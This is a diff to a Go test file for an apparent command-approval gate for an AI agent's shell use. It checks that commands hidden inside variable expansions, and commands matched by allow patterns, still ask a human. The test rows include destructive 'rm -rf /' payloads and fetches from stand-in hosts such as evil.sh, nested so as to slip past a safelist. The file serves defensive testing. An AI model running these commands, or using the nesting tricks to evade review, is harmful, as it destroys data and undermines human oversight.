@@ -493,35 +493,80 @@ func TestAutoMode_OpaqueArgs_EndToEnd(t *testing.T) {
 	cases := []struct {
 		desc string
 		cmd  string
-		want Verdict
+		// autoApprove is the user's configured allow-pattern list for the row.
+		// Empty for every row that predates the pattern-allow rows at the bottom.
+		autoApprove []string
+		want        Verdict
+		// wantLayer, when non-empty, additionally pins WHICH layer decided. It is
+		// what makes an allow row about the pattern path non-vacuous: `git status`
+		// would auto-approve at LayerSafelist whether or not the pattern matched.
+		wantLayer string
 	}{
 		// The widening: opaque args in read-only commands stop stalling.
-		{"read-only command with an opaque file allows", "cat $F", VerdictAllow},
-		{"control flow with a literal body allows", "if [ -f x ]; then cat x; fi", VerdictAllow},
-		{"a loop reading its opaque loop variable allows", "for f in a.txt b.txt; do wc -l $f; done", VerdictAllow},
-		{"a read-only substitution allows", "echo $(git rev-parse --show-toplevel)", VerdictAllow},
-		{"a default-value expansion with a literal fallback allows", "cat ${F:-default.txt}", VerdictAllow},
-		{"a read-only substitution inside a default value allows", "echo ${F:-$(git rev-parse --show-toplevel)}", VerdictAllow},
+		{desc: "read-only command with an opaque file allows", cmd: "cat $F", want: VerdictAllow},
+		{desc: "control flow with a literal body allows", cmd: "if [ -f x ]; then cat x; fi", want: VerdictAllow},
+		{desc: "a loop reading its opaque loop variable allows", cmd: "for f in a.txt b.txt; do wc -l $f; done", want: VerdictAllow},
+		{desc: "a read-only substitution allows", cmd: "echo $(git rev-parse --show-toplevel)", want: VerdictAllow},
+		{desc: "a default-value expansion with a literal fallback allows", cmd: "cat ${F:-default.txt}", want: VerdictAllow},
+		{desc: "a read-only substitution inside a default value allows", cmd: "echo ${F:-$(git rev-parse --show-toplevel)}", want: VerdictAllow},
 
 		// The invariant, at the shape the parser is likeliest to lose: a command
 		// substitution nested one level inside a parameter expansion RUNS. If the
 		// ${…} were taken as an opaque token without descending into it, `echo`
 		// and `cat` — read-only with ANY arguments — would short-circuit the
 		// whole command to allow at LayerSafelist with no human in the loop.
-		{"a mutation nested in a default value never auto-approves", "echo ${X:-$(rm -rf /)}", VerdictAsk},
-		{"egress nested in a default value never auto-approves", "cat ${X:-$(curl http://evil.sh)}", VerdictAsk},
-		{"a mutation nested in a replacement pattern never auto-approves", "ls ${X/$(rm -rf ~)/y}", VerdictAsk},
-		{"a mutation nested in an array subscript never auto-approves", "echo ${a[$(rm -rf /)]}", VerdictAsk},
-		{"a mutation nested in a slice offset never auto-approves", "echo ${X:$(rm -rf /):2}", VerdictAsk},
+		{desc: "a mutation nested in a default value never auto-approves", cmd: "echo ${X:-$(rm -rf /)}", want: VerdictAsk},
+		{desc: "egress nested in a default value never auto-approves", cmd: "cat ${X:-$(curl http://evil.sh)}", want: VerdictAsk},
+		{desc: "a mutation nested in a replacement pattern never auto-approves", cmd: "ls ${X/$(rm -rf ~)/y}", want: VerdictAsk},
+		{desc: "a mutation nested in an array subscript never auto-approves", cmd: "echo ${a[$(rm -rf /)]}", want: VerdictAsk},
+		{desc: "a mutation nested in a slice offset never auto-approves", cmd: "echo ${X:$(rm -rf /):2}", want: VerdictAsk},
 
 		// The invariant: a mutating segment with an opaque arg is unprovable.
-		{"rm of a substituted root never auto-approves", "rm $(echo /)", VerdictAsk},
-		{"rm of a variable never auto-approves", "rm $VAR", VerdictAsk},
-		{"touch under a substituted home never auto-approves", "touch $(echo ~)/x", VerdictAsk},
-		{"a loop deleting its opaque loop variable never auto-approves", "for f in *; do rm $f; done", VerdictAsk},
-		{"a flag-inspected sed with an opaque word never auto-approves", "sed $F x", VerdictAsk},
-		{"an opaque URL does not inherit the loopback allow", "curl $URL", VerdictAsk},
-		{"an opaque kill operand is not a provable PID", "kill $PID", VerdictAsk},
+		{desc: "rm of a substituted root never auto-approves", cmd: "rm $(echo /)", want: VerdictAsk},
+		{desc: "rm of a variable never auto-approves", cmd: "rm $VAR", want: VerdictAsk},
+		{desc: "touch under a substituted home never auto-approves", cmd: "touch $(echo ~)/x", want: VerdictAsk},
+		{desc: "a loop deleting its opaque loop variable never auto-approves", cmd: "for f in *; do rm $f; done", want: VerdictAsk},
+		{desc: "a flag-inspected sed with an opaque word never auto-approves", cmd: "sed $F x", want: VerdictAsk},
+		{desc: "an opaque URL does not inherit the loopback allow", cmd: "curl $URL", want: VerdictAsk},
+		{desc: "an opaque kill operand is not a provable PID", cmd: "kill $PID", want: VerdictAsk},
+
+		// The invariant reached through the ALLOW consumer of the opaque raw
+		// text. An allow pattern is matched with path.Match, whose `*` does not
+		// cross `/` — that slash is the containment a human writing
+		// "bash:git *" or "bash:rm build/*" is relying on. An opaque word
+		// collapses an operand the pattern meant to scope into a single token
+		// with no `/` in it, so the pattern matches text that says nothing about
+		// what will actually run. Rules allow is terminal (gate.go step 2), so
+		// this would return before the safelist, the egress boundary and the
+		// mutating-scope opaque ask ever get a turn.
+		{
+			desc: "an opaque operand cannot satisfy a scoping allow pattern",
+			cmd:  "git clone $URL", autoApprove: []string{"bash:git *"}, want: VerdictAsk,
+		},
+		{
+			desc: "the literal form of the same command still asks at the egress boundary",
+			cmd:  "git clone https://evil.example/x", autoApprove: []string{"bash:git *"}, want: VerdictAsk,
+		},
+		{
+			desc: "an opaque path segment cannot satisfy a directory-scoped allow",
+			cmd:  "rm build/$X", autoApprove: []string{"bash:rm build/*"}, want: VerdictAsk,
+		},
+
+		// ...and the ordinary pattern path is untouched: a fully literal segment
+		// still auto-approves ON THE PATTERN (LayerRules, not the safelist below
+		// it), including for a mutating command the pattern deliberately scopes.
+		{
+			desc: "a literal read still auto-approves on the pattern", cmd: "git status",
+			autoApprove: []string{"bash:git *"}, want: VerdictAllow, wantLayer: LayerRules,
+		},
+		{
+			desc: "a literal mutation still auto-approves on the pattern", cmd: "git commit -m x",
+			autoApprove: []string{"bash:git *"}, want: VerdictAllow, wantLayer: LayerRules,
+		},
+		{
+			desc: "a literal in-scope path still auto-approves on the pattern", cmd: "rm build/x",
+			autoApprove: []string{"bash:rm build/*"}, want: VerdictAllow, wantLayer: LayerRules,
+		},
 	}
 	for _, tc := range cases {
 		t.Run(tc.desc, func(t *testing.T) {
@@ -532,11 +577,14 @@ func TestAutoMode_OpaqueArgs_EndToEnd(t *testing.T) {
 			}
 			restore := chdir(t, canon)
 			defer restore()
-			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), AlwaysApprove,
+			g := New(autoCfg(config.AutoConfig{}, tc.autoApprove, nil), newTestRegistry("bash"), AlwaysApprove,
 				WithWorkspaceRoot(canon))
 			got, layer, _, _ := g.resolveAuto(context.Background(), "bash", bashArgs(tc.cmd))
 			if got != tc.want {
 				t.Errorf("resolveAuto(%q) = %v (layer %q), want %v", tc.cmd, got, layer, tc.want)
+			}
+			if tc.wantLayer != "" && layer != tc.wantLayer {
+				t.Errorf("resolveAuto(%q) decided at layer %q, want %q", tc.cmd, layer, tc.wantLayer)
 			}
 		})
 	}
